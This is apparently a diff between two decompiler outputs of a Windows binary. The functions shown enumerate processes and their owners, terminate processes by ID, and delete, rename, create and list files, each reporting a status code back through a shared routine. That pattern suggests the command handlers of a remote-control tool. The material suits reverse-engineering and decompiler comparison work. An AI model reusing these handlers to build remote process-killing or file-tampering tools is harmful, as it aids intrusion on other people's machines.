-                                *v20 = g6;
-                                CloseHandle((int32_t *)str);
-                                v16 = g62;
-                                if (v16 != 2) {
-                                    v21 = v15;
-                                    v17 = v16;
-                                    goto lab_0x4036da;
-                                }
-                                goto lab_0x40366b;
-                            }
-                        } else {
-                            v35 = v12;
-                            v34 = v29;
-                        }
-                    } else {
-                        v35 = v12;
-                        v34 = v29;
+        int32_t v32 = (int32_t)moduleHandle; // 0x4035ba
+        g5 = v32;
+        if (v32 == g7) {
+            // 0x40361b
+            *(int32_t *)(g8 - 4) = 5;
+            g3 = 5;
+            v14 = v32;
+            v6 = v1;
+            // branch -> 0x40384f
+            // 0x40384f
+            if (v6 != -1) {
+                // 0x403855
+                *(int32_t *)(g8 - 4) = v6;
+                CloseHandle((int32_t *)hObject);
+                // branch -> 0x40385e
+            }
+            // 0x40385e
+            if (v14 != 0) {
+                // 0x403864
+                *(int32_t *)(g8 - 4) = v14;
+                FreeLibrary((int32_t *)hObject);
+                // branch -> 0x40386d
+            }
+            // 0x40386d
+            v21 = g8;
+            *(int32_t *)(v21 - 4) = g3;
+            *(int32_t *)(v21 - 8) = (int32_t)&v4;
+            result = function_401f45((char *)g3, (int32_t)&str2);
+            v18 = g8;
+            g4 = *(int32_t *)(v18 + 4);
+            g7 = *(int32_t *)(v18 + 12);
+            g3 = *(int32_t *)(v18 + 16);
+            return result;
+        }
+        // 0x4035c9
+        g7 = *(int32_t *)0x4060c8;
+        c = (struct tagPROCESSENTRY32 *)"EnumProcessModules";
+        hObject = (char *)moduleHandle;
+        int32_t func = (int32_t)GetProcAddress(moduleHandle, "EnumProcessModules"); // 0x4035d5
+        v10 = "GetModuleFileNameExA";
+        v2 = func;
+        int32_t (*func2)() = GetProcAddress((int32_t *)g5, "GetModuleFileNameExA"); // 0x4035e0
+        if (v2 == 0 || func2 == NULL) {
+            // 0x40361b
+            *(int32_t *)(g8 - 4) = 5;
+            g3 = 5;
+            v14 = v32;
+            v6 = v1;
+            // branch -> 0x40384f
+            // 0x40384f
+            if (v6 != -1) {
+                // 0x403855
+                *(int32_t *)(g8 - 4) = v6;
+                CloseHandle((int32_t *)hObject);
+                // branch -> 0x40385e
+            }
+            // 0x40385e
+            if (v14 != 0) {
+                // 0x403864
+                *(int32_t *)(g8 - 4) = v14;
+                FreeLibrary((int32_t *)hObject);
+                // branch -> 0x40386d
+            }
+            // 0x40386d
+            v21 = g8;
+            *(int32_t *)(v21 - 4) = g3;
+            *(int32_t *)(v21 - 8) = (int32_t)&v4;
+            result = function_401f45((char *)g3, (int32_t)&str2);
+            v18 = g8;
+            g4 = *(int32_t *)(v18 + 4);
+            g7 = *(int32_t *)(v18 + 12);
+            g3 = *(int32_t *)(v18 + 16);
+            return result;
+        }
+        // 0x4035eb
+        v13 = v32;
+        v3 = g8;
+        // branch -> 0x4035ef
+        // 0x4035ef
+        *(int32_t *)(v3 - 4) = 0;
+        *(int32_t *)(v3 - 8) = 2;
+        v28 = CreateToolhelp32Snapshot((int32_t)(char *)func2, v2);
+        v30 = (int32_t)v28;
+        if (v28 != (int32_t *)-1) {
+            // 0x403600
+            v22 = &v11;
+            v11 = 296;
+            v19 = g8;
+            *(int32_t *)(v19 - 4) = v22;
+            *(int32_t *)(v19 - 8) = v30;
+            if (Process32First((int32_t *)v11, (struct tagPROCESSENTRY32 *)&str2)) {
+                // 0x403629
+                g5 = 1040;
+                v23 = &v9;
+                v24 = &v12;
+                v26 = &v7;
+                v27 = &v5;
+                v25 = &v8;
+                // branch -> 0x40362e
+                while (true) {
+                    // 0x40362e
+                    v20 = g8;
+                    *(int32_t *)(v20 - 4) = v23;
+                    *(int32_t *)(v20 - 8) = v24;
+                    strcpy(str, (char *)&str2);
+                    v15 = g8;
+                    *(int32_t *)v15 = 0;
+                    *(int32_t *)(v15 - 4) = g5;
+                    v29 = OpenProcess((int32_t)str, (bool)&str2, (int32_t)&str2);
+                    v31 = (int32_t)v29;
+                    *(int32_t *)(g8 - 4) = v31;
+                    GetPriorityClass((int32_t *)str);
+                    *(int32_t *)(g8 - 4) = v31;
+                    CloseHandle((int32_t *)str);
+                    v16 = g66;
+                    if (v16 != 2) {
+                        v17 = v16;
+                        goto lab_0x4036da;
                     }
-                } else {
-                    v35 = (struct tagPROCESSENTRY32 *)moduleHandle;
-                    v34 = v1;
+                    goto lab_0x40366b;
                 }
-            } else {
-                v35 = (struct tagPROCESSENTRY32 *)moduleHandle;
-                v34 = v1;
             }
         }
         // 0x40361b
-        hObject = (char *)5;
+        *(int32_t *)(g8 - 4) = 5;
         g3 = 5;
-        v13 = v35;
-        v5 = v34;
+        v14 = v13;
+        v6 = v30;
         // branch -> 0x40384f
         // 0x40384f
-        if (v5 != -1) {
+        if (v6 != -1) {
             // 0x403855
-            *(int32_t *)(g7 - 4) = v5;
+            *(int32_t *)(g8 - 4) = v6;
             CloseHandle((int32_t *)hObject);
             // branch -> 0x40385e
         }
         // 0x40385e
-        if (v13 == NULL) {
-            // 0x40385e
-            v22 = g7;
-            // branch -> 0x40386d
-        } else {
+        if (v14 != 0) {
             // 0x403864
-            v30 = g7;
-            *(int32_t *)(v30 - 4) = (int32_t)v13;
+            *(int32_t *)(g8 - 4) = v14;
             FreeLibrary((int32_t *)hObject);
-            v22 = v30;
             // branch -> 0x40386d
         }
         // 0x40386d
-        *(int32_t *)(v22 - 4) = g3;
-        *(int32_t *)(v22 - 8) = (int32_t)&v2;
-        return function_401f45((char *)g3, (int32_t)&str2);
+        v21 = g8;
+        *(int32_t *)(v21 - 4) = g3;
+        *(int32_t *)(v21 - 8) = (int32_t)&v4;
+        result = function_401f45((char *)g3, (int32_t)&str2);
+        v18 = g8;
+        g4 = *(int32_t *)(v18 + 4);
+        g7 = *(int32_t *)(v18 + 12);
+        g3 = *(int32_t *)(v18 + 16);
+        return result;
     }
-    // 0x403587
-    v12 = NULL;
-    // branch -> 0x4035ef
+    v13 = 0;
     // 0x4035ef
-    c = (struct tagPROCESSENTRY32 *)2;
-    v28 = CreateToolhelp32Snapshot(2, 0);
-    v29 = (int32_t)v28;
+    *(int32_t *)(v3 - 4) = 0;
+    *(int32_t *)(v3 - 8) = 2;
+    v28 = CreateToolhelp32Snapshot((int32_t)NULL, v2);
+    v30 = (int32_t)v28;
     if (v28 != (int32_t *)-1) {
         // 0x403600
-        v10 = 296;
-        hObject = (char *)&v10;
-        v9 = v29;
-        if (Process32First((int32_t *)296, (struct tagPROCESSENTRY32 *)&str2)) {
+        v22 = &v11;
+        v11 = 296;
+        v19 = g8;
+        *(int32_t *)(v19 - 4) = v22;
+        *(int32_t *)(v19 - 8) = v30;
+        if (Process32First((int32_t *)v11, (struct tagPROCESSENTRY32 *)&str2)) {
             // 0x403629
             g5 = 1040;
-            v23 = &v8;
-            v24 = &v11;
-            v26 = &v6;
-            v27 = &v4;
-            v25 = &v7;
+            v23 = &v9;
+            v24 = &v12;
+            v26 = &v7;
+            v27 = &v5;
+            v25 = &v8;
             // branch -> 0x40362e
             while (true) {
                 // 0x40362e
-                v18 = g7;
-                *(int32_t *)(v18 - 4) = v23;
-                *(int32_t *)(v18 - 8) = v24;
+                v20 = g8;
+                *(int32_t *)(v20 - 4) = v23;
+                *(int32_t *)(v20 - 8) = v24;
                 strcpy(str, (char *)&str2);
-                v15 = g7;
-                v19 = (int32_t *)v15;
-                v20 = (int32_t *)(v15 + 4);
-                *v20 = v14;
-                *v19 = 0;
+                v15 = g8;
+                *(int32_t *)v15 = 0;
                 *(int32_t *)(v15 - 4) = g5;
-                v31 = OpenProcess((int32_t)str, (bool)&str2, (int32_t)&str2);
-                v32 = (int32_t)v31;
-                g6 = v32;
-                *v20 = v32;
+                v29 = OpenProcess((int32_t)str, (bool)&str2, (int32_t)&str2);
+                v31 = (int32_t)v29;
+                *(int32_t *)(g8 - 4) = v31;
                 GetPriorityClass((int32_t *)str);
-                *v20 = g6;
+                *(int32_t *)(g8 - 4) = v31;
                 CloseHandle((int32_t *)str);
-                v16 = g62;
-                v21 = v15;
+                v16 = g66;
                 v17 = v16;
                 if (v16 == 2) {
                   lab_0x40366b:
                     // 0x40366b
-                    *v20 = g5;
-                    *v19 = v14;
-                    g6 = function_40338e((int32_t **)str, (int32_t)&str2);
-                    *(int32_t *)(g7 + 4) = (int32_t)&v9;
-                    *(int32_t *)g7 = 4;
-                    *(int32_t *)(g7 - 4) = (int32_t)&c;
-                    *(int32_t *)(g7 - 8) = g6;
-                    *(int32_t *)(g7 - 12) = 0x403689;
-                    __pseudo_call(v3);
-                    *(int32_t *)(g7 - 4) = 512;
-                    *(int32_t *)(g7 - 8) = v26;
-                    *(int32_t *)(g7 - 12) = (int32_t)c;
-                    *(int32_t *)(g7 - 16) = g6;
-                    *(int32_t *)(g7 - 20) = 0x4036a0;
-                    __pseudo_call((int32_t)NULL);
+                    *(int32_t *)(g8 - 4) = g5;
+                    int32_t v33 = function_40338e((int32_t **)str); // esi
+                    *(int32_t *)(g8 + 4) = (int32_t)&v10;
+                    *(int32_t *)g8 = 4;
+                    *(int32_t *)(g8 - 4) = (int32_t)&c;
+                    *(int32_t *)(g8 - 8) = v33;
+                    *(int32_t *)(g8 - 12) = 512;
+                    *(int32_t *)(g8 - 16) = v26;
+                    *(int32_t *)(g8 - 20) = (int32_t)c;
+                    *(int32_t *)(g8 - 24) = v33;
                     g1 = v26;
-                    *(int32_t *)(g7 - 4) = v26;
-                    function_4034cb(str);
-                    *(int32_t *)g7 = v27;
-                    *(int32_t *)(g7 - 4) = g6;
-                    int32_t v37 = g7;
+                    *(int32_t *)(g8 - 28) = v26;
+                    function_4034cb();
+                    *(int32_t *)g8 = v27;
+                    *(int32_t *)(g8 - 4) = g7;
                     if (function_404889() == 0) {
                         // 0x4036c0
-                        *(int32_t *)(g7 + 4) = (int32_t)"SYSTEM";
-                        *(int32_t *)g7 = v27;
+                        *(int32_t *)(g8 + 4) = (int32_t)"SYSTEM";
+                        *(int32_t *)g8 = v27;
                         strcpy(str, (char *)&str2);
-                        v37 = g7;
                         // branch -> 0x4036d3
                     }
                     // 0x4036d3
-                    *(int32_t *)(v37 + 4) = g6;
+                    *(int32_t *)(g8 + 4) = g7;
                     CloseHandle((int32_t *)str);
-                    v21 = v37;
-                    v17 = g62;
+                    v17 = g66;
                     // branch -> 0x4036da
                 }
-              lab_0x4036da:;
-                int32_t v38 = v21 + 8; // 0x403750
+              lab_0x4036da:
+                // 0x4036da
                 if (v17 == 1) {
                     // 0x4036e3
-                    *(int32_t *)(v21 + 4) = v23;
-                    *(int32_t *)v21 = v26;
+                    *(int32_t *)(g8 - 4) = v23;
+                    *(int32_t *)(g8 - 8) = v26;
                     strcpy(str, (char *)&str2);
-                    *(int32_t *)(g7 - 4) = 92;
-                    *(int32_t *)(g7 - 8) = v24;
+                    *(int32_t *)(g8 - 4) = 92;
+                    *(int32_t *)(g8 - 8) = v24;
                     hObject = (char *)256;
                     char * found_char_pos = strrchr((char *)256, (int32_t)c); // 0x403706
-                    *(int32_t *)(g7 - 4) = (int32_t)found_char_pos + 1;
-                    *(int32_t *)(g7 - 8) = v25;
+                    *(int32_t *)(g8 - 4) = (int32_t)found_char_pos + 1;
+                    *(int32_t *)(g8 - 8) = v25;
                     strcpy(hObject, (char *)c);
-                    *(int32_t *)(g7 - 4) = v25;
-                    *(int32_t *)(g7 - 8) = v24;
+                    *(int32_t *)(g8 - 4) = v25;
+                    *(int32_t *)(g8 - 8) = v24;
                     strcpy(hObject, (char *)c);
-                    *(int32_t *)(g7 + 28) = (int32_t)&hObject;
-                    *(int32_t *)(g7 + 24) = v27;
+                    *(int32_t *)(g8 + 28) = (int32_t)&hObject;
+                    *(int32_t *)(g8 + 24) = v27;
                     GetUserNameA(hObject, &c->e0);
-                    v38 = g7 + 32;
                     // branch -> 0x403741
                 }
-                int32_t v39 = v38; // 0x40378b
-                if (v14 == 0) {
+                // 0x403741
+                int32_t v34;
+                int32_t v35; // 0x403775
+                if (v34 != 0) {
+                    // 0x403741
+                    v35 = g8;
+                    // branch -> 0x40376f
+                } else {
                     // 0x40374a
-                    *(int32_t *)(v38 - 4) = (int32_t)&g10;
-                    *(int32_t *)(v38 - 8) = v24;
+                    *(int32_t *)(g8 - 4) = (int32_t)&g10;
+                    *(int32_t *)(g8 - 8) = v24;
                     strcpy(hObject, (char *)c);
-                    *(int32_t *)(g7 - 4) = (int32_t)"OS Kernel";
-                    *(int32_t *)(g7 - 8) = v26;
+                    *(int32_t *)(g8 - 4) = (int32_t)"OS Kernel";
+                    *(int32_t *)(g8 - 8) = v26;
                     strcpy(hObject, (char *)c);
-                    v39 = g7 + 16;
+                    v35 = g8 + 16;
                     // branch -> 0x40376f
                 }
-                int32_t * v40 = (int32_t *)(v39 - 4); // 0x403775
-                *v40 = (int32_t)"System";
-                int32_t * v41 = (int32_t *)(v39 - 8); // 0x40377a
-                *v41 = v24;
-                if (lstrcmpiA(hObject, (char *)c) == 0) {
+                // 0x40376f
+                *(int32_t *)(v35 - 4) = (int32_t)"System";
+                *(int32_t *)(v35 - 8) = v24;
+                int32_t v36; // 0x40379e
+                if (lstrcmpiA(hObject, (char *)c) != 0) {
+                    // 0x40376f
+                    v36 = g8;
+                    // branch -> 0x403798
+                } else {
                     // 0x403785
-                    *v40 = (int32_t)"OS Kernel";
-                    *v41 = v26;
+                    *(int32_t *)(g8 - 4) = (int32_t)"OS Kernel";
+                    *(int32_t *)(g8 - 8) = v26;
                     strcpy(hObject, (char *)c);
-                    v39 = g7 + 8;
+                    v36 = g8 + 8;
                     // branch -> 0x403798
                 }
                 // 0x403798
-                *(int32_t *)(v39 - 4) = (int32_t)&g15;
-                *(int32_t *)(v39 - 8) = v24;
+                *(int32_t *)(v36 - 4) = (int32_t)&g16;
+                *(int32_t *)(v36 - 8) = v24;
                 strcat(hObject, (char *)c);
-                *(int32_t *)(g7 - 4) = v26;
-                *(int32_t *)(g7 - 8) = v24;
+                *(int32_t *)(g8 - 4) = v26;
+                *(int32_t *)(g8 - 8) = v24;
                 strcat(hObject, (char *)c);
-                *(int32_t *)(g7 - 4) = (int32_t)&g14;
-                *(int32_t *)(g7 - 8) = v24;
+                *(int32_t *)(g8 - 4) = (int32_t)&g15;
+                *(int32_t *)(g8 - 8) = v24;
                 strcat(hObject, (char *)c);
-                *(int32_t *)(g7 - 4) = v24;
-                *(int32_t *)(g7 - 8) = g2 - 0x2744 + g3;
+                *(int32_t *)(g8 - 4) = v24;
+                *(int32_t *)(g8 - 8) = g2 - 0x2744 + g3;
                 strcpy(hObject, (char *)c);
-                *(int32_t *)(g7 - 4) = v24;
-                int32_t v42 = strlen(hObject) + 1 + g3; // 0x4037ed
-                *(int32_t *)(v42 - 0x2744 + g2) = v14;
-                g6 = v42 + 4;
-                *(int32_t *)(g7 - 4) = v27;
-                *(int32_t *)(g7 - 8) = g2 - 0x2744 + g6;
+                *(int32_t *)(g8 - 4) = v24;
+                g7 = strlen(hObject) + 1 + g3 + 4;
+                *(int32_t *)(g8 - 4) = v27;
+                *(int32_t *)(g8 - 8) = g2 - 0x2744 + g7;
                 strcpy(hObject, (char *)c);
-                *(int32_t *)(g7 - 4) = v27;
-                int32_t v43 = strlen(hObject) + 1 + g6; // 0x403821
-                *(int32_t *)(g7 - 4) = (int32_t)&v10;
-                g3 = v43 + 4;
-                *(int32_t *)(g7 - 8) = v29;
+                *(int32_t *)(g8 - 4) = v27;
+                int32_t v37 = strlen(hObject) + 1 + g7; // 0x403821
+                *(int32_t *)(g8 - 4) = v22;
+                g3 = v37 + 4;
+                *(int32_t *)(g8 - 8) = v30;
                 if (!Process32Next((int32_t *)hObject, c)) {
-                    v13 = v12;
-                    v5 = v29;
+                    v14 = v13;
+                    v6 = v30;
                     // break -> 0x40384f
                     break;
                 }
                 // continue -> 0x40362e
             }
             // 0x40384f
-            if (v5 != -1) {
+            if (v6 != -1) {
                 // 0x403855
-                *(int32_t *)(g7 - 4) = v5;
+                *(int32_t *)(g8 - 4) = v6;
                 CloseHandle((int32_t *)hObject);
                 // branch -> 0x40385e
             }
             // 0x40385e
-            if (v13 == NULL) {
-                // 0x40385e
-                v22 = g7;
-                // branch -> 0x40386d
-            } else {
+            if (v14 != 0) {
                 // 0x403864
-                v30 = g7;
-                *(int32_t *)(v30 - 4) = (int32_t)v13;
+                *(int32_t *)(g8 - 4) = v14;
                 FreeLibrary((int32_t *)hObject);
-                v22 = v30;
                 // branch -> 0x40386d
             }
             // 0x40386d
-            *(int32_t *)(v22 - 4) = g3;
-            *(int32_t *)(v22 - 8) = (int32_t)&v2;
-            return function_401f45((char *)g3, (int32_t)&str2);
+            v21 = g8;
+            *(int32_t *)(v21 - 4) = g3;
+            *(int32_t *)(v21 - 8) = (int32_t)&v4;
+            result = function_401f45((char *)g3, (int32_t)&str2);
+            v18 = g8;
+            g4 = *(int32_t *)(v18 + 4);
+            g7 = *(int32_t *)(v18 + 12);
+            g3 = *(int32_t *)(v18 + 16);
+            return result;
         }
     }
     // 0x40361b
-    hObject = (char *)5;
+    *(int32_t *)(g8 - 4) = 5;
     g3 = 5;
-    v13 = v12;
-    v5 = v29;
+    v14 = v13;
+    v6 = v30;
     // branch -> 0x40384f
     // 0x40384f
-    if (v5 != -1) {
+    if (v6 != -1) {
         // 0x403855
-        *(int32_t *)(g7 - 4) = v5;
+        *(int32_t *)(g8 - 4) = v6;
         CloseHandle((int32_t *)hObject);
         // branch -> 0x40385e
     }
     // 0x40385e
-    if (v13 == NULL) {
-        // 0x40385e
-        v22 = g7;
-        // branch -> 0x40386d
-    } else {
+    if (v14 != 0) {
         // 0x403864
-        v30 = g7;
-        *(int32_t *)(v30 - 4) = (int32_t)v13;
+        *(int32_t *)(g8 - 4) = v14;
         FreeLibrary((int32_t *)hObject);
-        v22 = v30;
         // branch -> 0x40386d
     }
     // 0x40386d
-    *(int32_t *)(v22 - 4) = g3;
-    *(int32_t *)(v22 - 8) = (int32_t)&v2;
-    return function_401f45((char *)g3, (int32_t)&str2);
-}
-
-// Address range: 0x403887 - 0x4038e6
-int32_t function_403887(int32_t * a1) {
-    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x40388e
-    g6 = (int32_t)moduleHandle;
-    int32_t func = (int32_t)GetProcAddress(moduleHandle, "TerminateProcess"); // 0x40389c
-    g5 = func;
-    FreeLibrary((int32_t *)g6);
-    int32_t v1 = function_40338e((int32_t **)a1, 1); // 0x4038b1
-    int32_t result; // 0x4038c7
-    if (v1 == 0) {
-        // 0x4038c3
-        result = 0;
-        // branch -> 0x4038c5
-    } else {
-        // 0x4038bc
-        __pseudo_call(func);
-        result = v1;
-        // branch -> 0x4038c5
-    }
-    // 0x4038c5
+    v21 = g8;
+    *(int32_t *)(v21 - 4) = g3;
+    *(int32_t *)(v21 - 8) = (int32_t)&v4;
+    result = function_401f45((char *)g3, (int32_t)&str2);
+    v18 = g8;
+    g4 = *(int32_t *)(v18 + 4);
+    g7 = *(int32_t *)(v18 + 12);
+    g3 = *(int32_t *)(v18 + 16);
     return result;
 }
 
-// Address range: 0x4038e7 - 0x403b41
-int32_t function_4038e7(int32_t dwProcessId) {
-    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x4038ee
-    int32_t func = (int32_t)GetProcAddress(moduleHandle, "TerminateProcess"); // 0x4038fc
+// Address range: 0x403887 - 0x4038c8
+int32_t function_403887(int32_t a1) {
+    char * v1 = "Kernel32.dll"; // bp-12
+    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x40388e
+    GetProcAddress(moduleHandle, "TerminateProcess");
+    int32_t v2 = (int32_t)moduleHandle; // bp-24
     FreeLibrary(moduleHandle);
-    int32_t * v1 = OpenProcess(1, false, dwProcessId); // 0x403913
+    int32_t v3 = *(int32_t *)&v1; // 0x4038ad4
+    char * v4 = NULL; // bp-32
+    *(int32_t *)&v4 = v3;
+    int32_t v5 = function_40338e((int32_t **)v3); // 0x4038b1
+    int32_t v6; // 0x4038c5
+    int32_t result; // 0x4038c7
+    if (v5 == 0) {
+        // 0x4038c3
+        result = 0;
+        v6 = &v2;
+        // branch -> 0x4038c5
+    } else {
+        int32_t v7 = (int32_t)&v4; // 0x4038ad
+        v4 = (char *)v5;
+        result = v5;
+        v6 = v7;
+        // branch -> 0x4038c5
+    }
+    // 0x4038c5
+    g5 = *(int32_t *)v6;
+    g7 = *(int32_t *)(v6 + 4);
+    return result;
+}
+
+// Address range: 0x4038c8 - 0x4038e7
+int32_t function_4038c8(void) {
+    int32_t v1 = g33->e0; // 0x4038cd
+    function_403887(v1);
+    g63 = 69;
+    return function_403e89(v1);
+}
+
+// Address range: 0x4038e7 - 0x403929
+int32_t function_4038e7(int32_t a1) {
+    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x4038ee
+    GetProcAddress(moduleHandle, "TerminateProcess");
+    FreeLibrary(moduleHandle);
+    int32_t * v1 = OpenProcess(1, false, (int32_t)"Kernel32.dll"); // 0x403913
+    int32_t v2 = (int32_t)v1; // 0x403913
+    int32_t v3; // 0x403926
     int32_t result; // 0x403928
     if (v1 == NULL) {
         // 0x403924
         result = 0;
+        v3 = g8;
         // branch -> 0x403926
     } else {
-        // 0x40391d
-        __pseudo_call(func);
-        result = (int32_t)v1;
+        int32_t v4 = v2; // bp-44
+        result = v2;
+        v3 = &v4;
         // branch -> 0x403926
     }
     // 0x403926
+    g5 = *(int32_t *)v3;
+    g7 = *(int32_t *)(v3 + 4);
     return result;
 }
 
-// Address range: 0x403b42 - 0x403cd4
+// Address range: 0x403929 - 0x403948
+int32_t function_403929(void) {
+    int32_t v1 = g33->e0; // 0x40392e
+    function_4038e7(v1);
+    g63 = 69;
+    return function_403e89(v1);
+}
+
+// Address range: 0x403948 - 0x403966
+int32_t function_403948(void) {
+    int32_t v1 = *(int32_t *)&g33; // 0x4039482
+    function_40511a((char *)v1);
+    g63 = 69;
+    return function_403e89(v1);
+}
+
+// Address range: 0x403966 - 0x403a21
+int32_t function_403966(void) {
+    int32_t v1 = g2; // bp-4
+    g2 = &v1;
+    int32_t v2 = g7; // bp-1032
+    int32_t str; // bp-1028
+    char * str3 = (char *)&str; // bp-1040
+    strcpy((char *)&str, (char *)*(int32_t *)&g33);
+    char * str2 = (char *)&str; // bp-1044
+    int32_t len = strlen((char *)&str); // 0x403989
+    int32_t v3; // bp-516
+    int32_t v4 = &v3; // 0x4039a3
+    int32_t v5 = len + 1; // 0x40399327
+    g7 = v5;
+    if ((struct _WIN32_FIND_DATAA *)v5 < g30) {
+        int32_t v6 = &v2; // 0x4039a2
+        while (true) {
+            // 0x40399c
+            *(int32_t *)(v6 - 4) = (int32_t)&str;
+            *(int32_t *)(v6 - 8) = v4;
+            strcpy(str2, str3);
+            *(int32_t *)(g8 - 4) = g7 + (int32_t)g33;
+            *(int32_t *)(g8 - 8) = v4;
+            strcat(str2, str3);
+            *(int32_t *)(g8 - 4) = g7 + (int32_t)g33;
+            g7 += strlen(str2) + 1;
+            *(int32_t *)(g8 + 16) = 0;
+            *(int32_t *)(g8 + 12) = v4;
+            SetFileAttributesA(str2, (int32_t)str3);
+            int32_t * v7 = (int32_t *)(g8 - 4); // 0x403a06
+            if (*(char *)(g7 + (int32_t)g33) != 48) {
+                // 0x403a00
+                *v7 = 76;
+                *(int32_t *)(g8 - 8) = v4;
+                function_403eae((struct _WIN32_FIND_DATAA *)str2, (int32_t)str3);
+                // branch -> 0x403993
+            } else {
+                // 0x4039f1
+                *v7 = v4;
+                DeleteFileA(str2);
+                // branch -> 0x403993
+            }
+            int32_t v8 = g7 + 1; // 0x403993
+            g7 = v8;
+            if ((struct _WIN32_FIND_DATAA *)v8 < g30) {
+                // 0x403993
+                v6 = g8;
+                // branch -> 0x40399c
+                continue;
+            }
+        }
+    }
+    // 0x403a12
+    g63 = 79;
+    int32_t result = function_403e89((int32_t)str2); // 0x403a19
+    g7 = *(int32_t *)g8;
+    g2 = v1;
+    return result;
+}
+
+// Address range: 0x403a21 - 0x403a58
+int32_t function_403a21(void) {
+    struct _NETRESOURCEA * str = g33; // 0x403a21
+    int32_t v1 = g7; // 0x403a26
+    g7 = (int32_t)str;
+    int32_t file_path = g7; // 0x403a3a
+    rename((char *)file_path, (char *)(strlen((char *)str) + 1 + (int32_t)g33));
+    g63 = 79;
+    int32_t result = function_403e89(file_path); // 0x403a51
+    g7 = v1;
+    return result;
+}
+
+// Address range: 0x403a58 - 0x403ae7
+int32_t function_403a58(void) {
+    int32_t len = strlen((char *)*(int32_t *)&g33); // 0x403a63
+    struct _NETRESOURCEA * str = g33; // 0x403a68
+    unsigned char v1 = *(char *)(len + 1 + (int32_t)str); // 0x403a6f
+    int32_t v2 = g3; // 0x403a6f
+    int32_t len2 = strlen((char *)str); // 0x403a73
+    struct _NETRESOURCEA * str2 = g33; // 0x403a78
+    int32_t len3 = strlen((char *)str2); // 0x403a86
+    struct _NETRESOURCEA * lpFileName = g33; // 0x403a8b
+    int32_t v3 = GetFileAttributesA((char *)lpFileName); // 0x403a9c
+    g3 = (int32_t)lpFileName;
+    int32_t v4; // 0x403ab8
+    if ((char)(v2 & -256 || (int32_t)v1) != 49) {
+        // 0x403aac
+        v4 = v3 & -2;
+        // branch -> 0x403aae
+    } else {
+        // 0x403aa8
+        v4 = v3 | 1;
+        // branch -> 0x403aae
+    }
+    // 0x403aae
+    int32_t v5; // 0x403ac4
+    if (*(char *)(len2 + 2 + (int32_t)str2) != 49) {
+        // 0x403ab8
+        v5 = v4 & -3;
+        // branch -> 0x403aba
+    } else {
+        // 0x403ab4
+        v5 = v4 | 2;
+        // branch -> 0x403aba
+    }
+    // 0x403aba
+    int32_t dwFileAttributes;
+    if (*(char *)(len3 + 3 + (int32_t)lpFileName) != 49) {
+        // 0x403ac4
+        dwFileAttributes = v5 & -5;
+        // branch -> 0x403ac6
+    } else {
+        // 0x403ac0
+        dwFileAttributes = v5 | 4;
+        // branch -> 0x403ac6
+    }
+    int32_t lpFileName2 = *(int32_t *)&g33; // 0x403ac75
+    SetFileAttributesA((char *)lpFileName2, dwFileAttributes);
+    g63 = 69;
+    return function_403e89(lpFileName2);
+}
+
+// Address range: 0x403ae7 - 0x403b07
+int32_t function_403ae7(void) {
+    int32_t lpPathName = *(int32_t *)&g33; // 0x403ae93
+    CreateDirectoryA((char *)lpPathName, NULL);
+    g63 = 69;
+    return function_403e89(lpPathName);
+}
+
+// Address range: 0x403b07 - 0x403b42
+int32_t function_403b07(void) {
+    int32_t lpFileName = *(int32_t *)&g33; // 0x403b153
+    int32_t * fileHandle = CreateFileA((char *)lpFileName, 0x40000000, 0, NULL, 2, 2, NULL); // 0x403b1b
+    char v1;
+    int32_t v2; // 0x403b3d
+    if (fileHandle != (int32_t *)-1) {
+        // 0x403b26
+        CloseHandle(fileHandle);
+        v2 = (int32_t)fileHandle;
+        v1 = 79;
+        // branch -> 0x403b3d
+    } else {
+        int32_t v3;
+        v2 = v3;
+        v1 = 69;
+    }
+    // 0x403b3d
+    g63 = v1;
+    return function_403e89(v2);
+}
+
+// Address range: 0x403b42 - 0x403cd5
 int32_t function_403b42(void) {
     int32_t v1 = g2; // bp-4
     g2 = &v1;
-    int32_t v2 = *(int32_t *)&g31; // 0x403b5a9
+    int32_t v2 = g5; // bp-548
+    int32_t v3 = &v2; // 0x403b4d
+    int32_t v4 = *(int32_t *)&g33; // 0x403b5a11
+    struct _NETRESOURCEA * v5 = NULL; // bp-556
+    *(int32_t *)&v5 = v4;
+    int32_t v6 = (int32_t)&v5; // 0x403b5a
     int32_t str = 0; // bp-536
-    memcpy(&str, &((struct _NETRESOURCEA *)v2)->e0, *(int32_t *)&g28);
-    g6 = 0x6b46;
-    int32_t found_char_pos = (int32_t)strrchr((char *)*(int32_t *)&g31, 92); // 0x403b74
+    memcpy(&str, &((struct _NETRESOURCEA *)v4)->e0, *(int32_t *)&g30);
+    g7 = 0x6b46;
+    int32_t found_char_pos = (int32_t)strrchr((char *)*(int32_t *)&g33, 92); // 0x403b74
     g1 = found_char_pos;
     function_403d8d(found_char_pos);
     char * found_char_pos2 = strrchr((char *)&str, 92); // 0x403b85
@@ -4143,373 +5603,1594 @@ int32_t function_403b42(void) {
         // branch -> 0x403b92
     }
     // 0x403b92
+    v5 = (struct _NETRESOURCEA *)&str;
     strcat((char *)&str, "*.*");
-    int32_t v3 = 66; // bp-24
+    char v7 = 66; // bp-24
     int32_t * mem = malloc(0x7d00); // 0x403bac
     int32_t result = (int32_t)mem; // 0x403bac
-    g5 = result;
+    int32_t v8; // 0x403cbd
     if (mem == NULL) {
+        v8 = v3;
         // 0x403cbd
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = v1;
         return result;
     }
-    int32_t v4 = function_403d21((char *)&str); // 0x403bc6
-    g6 = v4;
-    int32_t * v5;
-    if (v4 == -1) {
-        // 0x403bbf
-        // branch -> 0x403cb5
+    int32_t v9 = function_403d21((char *)&str); // 0x403bc6
+    g7 = v9;
+    int32_t hFindFile; // bp-12
+    int32_t v10; // 0x403cbc
+    int32_t * v11;
+    if (v9 == -1) {
         // 0x403cb5
-        free(mem);
+        *(int32_t *)(v3 - 4) = result;
+        hFindFile = 0;
+        free((int32_t *)hFindFile);
+        v10 = g8;
+        g4 = *(int32_t *)v10;
+        v8 = v10 + 4;
         // branch -> 0x403cbd
         // 0x403cbd
-        return (int32_t)&v5;
+        g7 = *(int32_t *)(v8 + 4);
+        g3 = *(int32_t *)(v8 + 8);
+        g2 = v1;
+        return (int32_t)&v11;
     }
     // 0x403bd7
-    if (v4 == 0) {
+    if (v9 == 0) {
         // 0x403bdb
-        g6 = 1;
+        g7 = 1;
         // branch -> 0x403bde
     }
